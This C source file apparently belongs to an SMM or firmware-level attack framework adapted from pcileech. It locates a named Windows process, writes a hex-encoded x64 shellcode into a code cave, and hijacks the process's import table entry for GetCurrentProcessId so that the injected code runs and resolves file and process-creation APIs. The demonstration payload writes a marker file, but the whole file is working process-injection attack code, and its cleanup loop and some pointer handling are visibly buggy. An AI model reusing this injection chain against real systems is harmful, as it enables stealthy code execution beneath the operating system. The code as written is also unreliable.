#include "WinUmdIATHook.h"

// From NtKernelTools.c
extern WinCtx *winGlobal;

// shellcode to inject into the UMD
const UINT8 WinUmdIATShellCode[] = {
  0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0xEB, 0x10, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
  0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x50, 0x48, 0x8B, 0x0D, 0xE8, 0xFF, 0xFF, 0xFF,
  0x48, 0x83, 0xEC, 0x30, 0xE8, 0x13, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x30, 0x58, 0x41, 0x59,
  0x41, 0x58, 0x5A, 0x59, 0xFF, 0x25, 0xD6, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48,
  0x89, 0x58, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x83, 0x79, 0x18, 0x00, 0x48, 0x8B, 0xD9,
  0x74, 0x52, 0x48, 0x83, 0x60, 0xE8, 0x00, 0x48, 0x83, 0xC1, 0x58, 0xC7, 0x40, 0xE0, 0x80, 0x00,
  0x00, 0x00, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0xC7, 0x40, 0xD8, 0x02, 0x00, 0x00, 0x00, 0xBA,
  0x00, 0x00, 0x00, 0xC0, 0xFF, 0x53, 0x20, 0x48, 0x8B, 0xF8, 0x48, 0x83, 0xF8, 0xFF, 0x74, 0x24,
  0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x48, 0x8D, 0x93, 0xBC, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC9,
  0x48, 0x8B, 0xC8, 0x45, 0x8D, 0x41, 0x10, 0xFF, 0x53, 0x48, 0x48, 0x8B, 0xCF, 0xFF, 0x53, 0x18,
  0xC6, 0x43, 0x08, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x40, 0x5F, 0xC3 };

// these vars are needed between different stages, therefore
// they are defined global
static WinProc TargetProcess;
static WinModule TargetModule;
static PE_THUNKINFO_IAT oThunkInfoIAT;
static UINT64 vaCodeCave;
static UINT64 vaWriteCave;
static WinUmdIATState currState;

// Find the process
static BOOLEAN WindowsUmdIATHookStage1()
{
  //-----------------------------------------
  // 0: Find the process and its base module
  //-----------------------------------------
  BOOLEAN verbose = FALSE;
  WinProc process;

  if (!DumpSingleProcess(winGlobal, "smm_target.exe", &process, verbose))
  {
    return FALSE;
  }
  else
  {
    TargetProcess.dirBase = process.dirBase;
    TargetProcess.physProcess = process.physProcess;
    TargetProcess.process = process.process;
  }

  TargetModule.name = "smm_target.exe";
  if (!DumpSingleModule(winGlobal, &TargetProcess, &TargetModule, verbose))
  {
    SerialPrintStringDebug("Failed parsing the base exe module! \r\n");
    return FALSE;
  }
  return TRUE;
}

// From pcileech, for injecting UM shellcode into the target
static BOOLEAN WindowsUmdIATHookStage2()
{
  WinUmdIATCtxLimited ctx;
  CHAR8 *HookModuleName = "kernel32.dll";
  CHAR8 *HookFunctionName = "GetCurrentProcessId";

  // Sanity checking
  if (TargetProcess.dirBase == 0 || TargetModule.baseAddress == 0)
  {
    SerialPrintStringDebug("The process dirbase or its module baseaddress was 0!\r\n");
    return FALSE;
  }

  // Nullify variables that were possibly set last time
  vaCodeCave = 0;
  vaWriteCave = 0;
  for (INT32 i = 0; i < sizeof(PE_THUNKINFO_IAT); i++)
  {
    ((UINT8 *)&oThunkInfoIAT)[i] = 0;
  }

  //--------------------------------------------------------------------------
  // 1: Verify process and locate 'IAT inject', r-x 'code cave' and rw- 'config cave'.
  //--------------------------------------------------------------------------

  SerialPrintStringDebug("  Getting process IAT Thunk ...\r\n");
  if (!ProcessGetThunkInfoIAT(&TargetProcess, &TargetModule, HookModuleName, HookFunctionName, &oThunkInfoIAT))
  {
    SerialPrintString("ERROR: UMD EXEC: Could not get IAT Info!\r\n");
    return FALSE;
  }
  if (!oThunkInfoIAT.fValid || oThunkInfoIAT.f32)
  {
    SerialPrintString("ERROR: UMD: EXEC: Could not retrieve valid hook in 64-bit process.\r\n");
    return FALSE;
  }

  SerialPrintStringDebug("  Finding process sections for code & write caves ...\r\n");
  UINT32 cSections;
  PIMAGE_SECTION_HEADER pSections;
  if (!ProcessGetSections(&TargetProcess, &TargetModule, NULL, 0, &cSections) || !cSections)
  {
    SerialPrintString("ERROR: UMD: EXEC: Could not retrieve sections #1\r\n");
    return FALSE;
  }

  pSections = (PIMAGE_SECTION_HEADER)malloc(cSections * sizeof(IMAGE_SECTION_HEADER));
  if (!pSections || !ProcessGetSections(&TargetProcess, &TargetModule, pSections, cSections, &cSections) || !cSections)
  {
    SerialPrintString("ERROR: UMD: EXEC: Could not retrieve sections #2\r\n");
    return FALSE;
  }

  for (UINT32 i = 0; i < cSections; i++)
  {
    // 0x500 magic number for ShellCode to fit in
    if (!vaCodeCave && (pSections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && ((pSections[i].Misc.VirtualSize & 0xfff) < (0x1000 - 0x500)))
    {
      vaCodeCave = TargetModule.baseAddress + ((pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize + 0xfff) & ~0xfff) - 0x500;
      if (!VTOP(vaCodeCave & ~0xfff, TargetProcess.dirBase, FALSE))
      {
        vaCodeCave = 0; // read test failed!
      }
    }
    if (!vaWriteCave && (pSections[i].Characteristics & IMAGE_SCN_MEM_WRITE) && ((pSections[i].Misc.VirtualSize & 0xfff) < (0x1000 - sizeof(ctx))))
    {
      vaWriteCave += TargetModule.baseAddress + ((pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize + 0xfff) & ~0xfff) - sizeof(ctx);
      if (!VTOP(vaWriteCave & ~0xfff, TargetProcess.dirBase, FALSE))
      {
        vaWriteCave = 0; // read test failed!
      }
    }
  }
  if (!vaCodeCave || !vaWriteCave)
  {
    if (!vaCodeCave)
    {
      SerialPrintString("ERROR: UMD: EXEC: Could not find a code cave!\r\n");
    }
    if (!vaWriteCave)
    {
      SerialPrintString("ERROR: UMD: EXEC: Could not find a write cave!\r\n");
    }
    return FALSE;
  }

  //------------------------------------------------
  // 2: Prepare injection and patch shellcode
  //------------------------------------------------

  SerialPrintStringDebug("  Suitable caves found! Dumping kernel32.dll exports ...\r\n");
  // Prepare shellcode (goes into r-x section)
  UINT8 *ShellCode = (UINT8 *)malloc(sizeof(WinUmdIATShellCode));
  p_memCpy((UINT64)ShellCode, (UINT64)WinUmdIATShellCode, sizeof(WinUmdIATShellCode), FALSE);
  *(UINT64 *)(ShellCode + 0x08) = vaWriteCave;
  *(UINT64 *)(ShellCode + 0x10) = oThunkInfoIAT.vaFunction;

  // Dump the module kernel32.dll, we need it to map exports
  WinModule kernel32_dll;
  kernel32_dll.name = "kernel32.dll";
  if (!DumpSingleModule(winGlobal, &TargetProcess, &kernel32_dll, FALSE))
  {
    SerialPrintStringDebug("Could not dump kernel32.dll from the target process!\r\n");
    free(ShellCode);
    return FALSE;
  }

  // TODO: atomicity / mutex with cmpxchg as in pcileech !
  ctx.CMPXCHG = 0;
  // Prepare configuration data (goes into rw- section)
  ctx.fn.CloseHandle = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "CloseHandle");
  ctx.fn.CreateFileA = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "CreateFileA");
  ctx.fn.CreateProcessA = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "CreateProcessA");
  ctx.fn.CreateThread = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "CreateThread");
  ctx.fn.GetExitCodeProcess = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "GetExitCodeProcess");
  ctx.fn.ReadFile = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "ReadFile");
  ctx.fn.WriteFile = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "WriteFile");
  ctx.fn.LocalAlloc = ProcessGetProcAddress(&TargetProcess, &kernel32_dll, "LocalAlloc");
  // hardcoded name to make it ez
  p_memCpy((UINT64)ctx.ParamString1, (UINT64) "c:\\smm.txt", strlen("c:\\smm.txt") + 1, FALSE);
  p_memCpy((UINT64)ctx.ParamString2, (UINT64) "Hello from SMM!", strlen("Hello from SMM!") + 1, FALSE);

  //------------------------------------------------
  // 4: TODO: Inject & hook IAT
  //------------------------------------------------

  v_memWrite(vaWriteCave, (UINT64)&ctx, sizeof(WinUmdIATCtxLimited), TargetProcess.dirBase, FALSE);
  v_memWrite(vaCodeCave, (UINT64)ShellCode, sizeof(WinUmdIATShellCode), TargetProcess.dirBase, FALSE);
  v_memWrite(oThunkInfoIAT.vaThunk, (UINT64)&vaCodeCave, 8, TargetProcess.dirBase, FALSE);

  free(ShellCode);
  return TRUE;
}

static BOOLEAN WindowsUmdIATHookStage3()
{
  //------------------------------------------------
  // 5: Check for execution after wait
  //------------------------------------------------
  BOOLEAN ret = TRUE;
  WinUmdIATCtxLimited ctx;

  v_memReadMultiPage((UINT64)&ctx, (UINT64)&vaWriteCave, sizeof(WinUmdIATCtxLimited), TargetProcess.dirBase, FALSE);

  // The UMD program did not update the status field in context struct,
  // the execution failed
  if (!ctx.Status)
  {
    SerialPrintStringDebug("  UMD: FAILED! Error or Timeout after 15s.\r\n");
    ret = FALSE;
  }
  else
    SerialPrintStringDebug("  UMD: Execution succeeded! Restoring ...\r\n");

  //------------------------------------------------
  // 6: Restore
  //------------------------------------------------

  // Restore the IAT hook
  v_memWrite(oThunkInfoIAT.vaThunk, (UINT64)&oThunkInfoIAT.vaFunction, 8, TargetProcess.dirBase, FALSE);

  // Nullify write cave ...
  for (INT32 i = 0; sizeof(WinUmdIATCtxLimited); i++)
  {
    ((UINT8 *)&ctx)[i] = 0;
  }
  v_memWrite(vaWriteCave, (UINT64)&ctx, sizeof(WinUmdIATCtxLimited), TargetProcess.dirBase, FALSE);

  // ... and the code cave. If malloc fails, we simply
  // bail out without restoring the code cave.
  UINT8 *ShellCode = (UINT8 *)malloc(sizeof(WinUmdIATShellCode));
  if (!ShellCode)
  {
    SerialPrintStringDebug("  UMD: Restoring code cave failed! Execution may have succeeded anyway ...\r\n");
    return ret;
  }
  for (INT32 i = 0; i < sizeof(WinUmdIATShellCode); i++)
  {
    ShellCode[i] = 0;
  }
  free(ShellCode);

  return ret;
}

BOOLEAN WindowsUmdIATHook()
{
  // Choose appropriate action depending on current state
  switch (currState)
  {

  case SUCCESS:
  {
    return TRUE;
  }

  case NO_PROCESS:
  {
    SerialPrintStringDebug("\r\n==  Finding target process ... ==\r\n");

    // If we (still) can't find the process, bail out
    if (!WindowsUmdIATHookStage1())
    {
      SerialPrintStringDebug("\r\n  Could not find target process ... We will try again :-)\r\n");
      break;
    }

    SerialPrintStringDebug("\r\n==  Found and dumped process! Starting IAT Hooking ==\r\n");

    // If the stage 2 succeeds, change the status so that
    // the execution is waited next time this func is entered
    if (WindowsUmdIATHookStage2())
    {
      SerialPrintStringDebug("\r\n== IAT Hooking done! Now waiting for execution :-) == \r\n\r\n");
      currState = WAITING_EXECUTION;
    }
    else
    {
      currState = NO_PROCESS;
    }
    
    break;
  }

  case WAITING_EXECUTION:
  {
    // TODO: check time
    if (WindowsUmdIATHookStage3())
    {
      SerialPrintStringDebug("\r\n== !!IAT Hooking successful!! == \r\n\r\n");
      currState = SUCCESS;
    }
    else
    {
      // Start from beginning if the hooking failed
      currState = NO_PROCESS;
    }

    break;
  }
  }

  return TRUE;
}

VOID InitWindowsUmdIATHook()
{
  currState = NO_PROCESS;
  return;
}